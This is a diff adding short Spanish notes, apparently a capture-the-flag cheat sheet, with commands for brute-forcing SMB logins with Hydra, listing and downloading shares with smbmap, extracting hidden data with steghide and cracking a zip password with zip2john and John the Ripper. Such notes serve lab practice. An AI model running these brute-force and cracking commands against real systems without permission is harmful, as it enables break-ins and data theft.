@@ -1,0 +1,18 @@
+Hydra al smb:
+hydra -L user.txt -P pass.txt IP smb
+
+Ver carpetas compartidas:
+smbmap -H IP -u user -p pass
+smbmap -H IP -u user -p pass -r folder
+
+Descargar archivo:
+smbmap -H IP -u user -p pass --download path/file
+
+Extraer archivo de la foto:
+steghide extract -sf image
+
+Obtener hash zip:
+zip2john secret.zip > hash
+
+Romper hash:
+john -w wordlist hash
